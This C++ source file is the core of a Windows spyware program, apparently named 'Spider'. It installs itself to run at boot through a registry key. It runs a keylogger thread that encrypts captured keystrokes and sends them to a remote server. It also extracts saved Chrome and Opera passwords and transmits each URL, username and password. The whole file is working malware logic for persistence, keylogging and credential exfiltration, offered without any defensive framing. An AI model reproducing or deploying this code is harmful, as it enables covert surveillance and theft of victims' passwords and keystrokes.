
#include "stdafx.h"
#include "WManager.hh"

WManager::WManager(const char *exePath)
{
	_network = new WNetwork;
	_exePath.append(exePath);
	runAtBoot();
}

WManager::~WManager()
{
}

void				WManager::launchApp()
{
	EncryptData		crypter;
	KeyHook			keyHooker;
	std::thread		keylogThread(hookHandlingLoop, keyHooker);
	clock_t			time;
	std::string		keyBuffer;
	static bool		clockIsOn = false;

	getBrowserPassword(keyHooker.getUserName());
	while (42)
	{
		if (!(keyHooker.bufferIsEmpty()))
		{
			if (!(clockIsOn))
			{
				clockIsOn = true;
				time = clock();
			}
			else if ((((clock() - time) / CLOCKS_PER_SEC) >= _TEMPO_SEND_KEY) && keyHooker.bufferIsPadded())
			{
				clockIsOn = false;
				keyBuffer = crypter.encryptData(keyHooker.getKey());
				_network->sendToServer(keyBuffer.c_str(), keyBuffer.size());
				std::cout << keyBuffer << "\tsize : " << keyBuffer.size() << std::endl;
			}
		}
		Sleep(1);
	}
	std::terminate();
}

const int			WManager::connectToServer(const char *ipSrv, const uint16_t port)
{
	initDatabase();
	if (_network->initClient(ipSrv, port) == _ERROR)
		return (_ERROR);
	return (_network->connectToServer()); 
}

void				WManager::sendBrowserPassword(const std::vector<BrowserPassword::t_loginConnection> &passwords,
													  const std::string &userName)
{
	std::string		buffer;
	std::vector<BrowserPassword::t_loginConnection>::const_iterator	it;

	it = passwords.begin();
	while (it != passwords.end())
	{
		buffer = _PASSWD_PROTOCOL + _BUFFER_SEPARATOR + userName + _BUFFER_SEPARATOR + it->_url + _BUFFER_SEPARATOR + it->_username + _BUFFER_SEPARATOR + it->_password;
		_network->sendToServer(buffer.c_str(), buffer.size());
		++it;
	}
}

void				WManager::getBrowserPassword(const std::string &userName)
{
	BrowserPassword	browser;
	
	browser.setBrowserType(BrowserPassword::BrowserType::CHROME);
	browser.databaseSpying();
	if (!browser.passwordIsEmpty())
	{
		sendBrowserPassword(browser.getBrowserInfo(), userName);
		std::cout << "[OK]\tChrome password successfuly sent" << std::endl;
	}
	else
		std::cerr << "[KO]\tThere is no Chrome password" << std::endl;
	browser.setBrowserType(BrowserPassword::BrowserType::OPERA);
	browser.databaseSpying();
	if (!browser.passwordIsEmpty())
	{
		sendBrowserPassword(browser.getBrowserInfo(), userName);
		std::cout << "[OK]\tOpera password successfuly sent" << std::endl;
	}
	else
		std::cerr << "[KO]\tThere is no Opera password" << std::endl;
}

void				WManager::initDatabase()
{
	size_t			pos;
	std::wstring	word;
	std::wstring	pass(_INIT_CHAR, _exePath.size());
	wchar_t			unicodePath[MAX_PATH] = { 0 };

	std::mbstowcs(&pass.at(0), &_exePath.at(0), _exePath.size());
	if ((pos = pass.find_last_of(_INIT_CHAR)) != std::string::npos)
		pass = pass.substr(0, pos);
	pass.append(_DATABASE_PASSWD);
	SHGetFolderPath(NULL, (int)BrowserPassword::BrowserType::OPERA, NULL, 0, unicodePath);
	word = unicodePath;
	word.append(_DATABASE_SQLITE);
	InitDatabase(pass.c_str(), word.c_str(), _DATABASE_FLAG);
	std::string		pad(word.begin(), word.end());
	ClearDatabase(pad.c_str());
}

void				WManager::runAtBoot()
{
	HKEY														hkey = NULL;
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>		convertUnicodeToUTF;
	std::wstring												path = convertUnicodeToUTF.from_bytes(_exePath);

	RegCreateKey(HKEY_CURRENT_USER, _REGISTER_KEY_PATH, &hkey);
	RegSetValueEx(hkey, L"Spider", 0, REG_SZ, (BYTE*)path.c_str(), (path.size() + 1) * sizeof(wchar_t));
}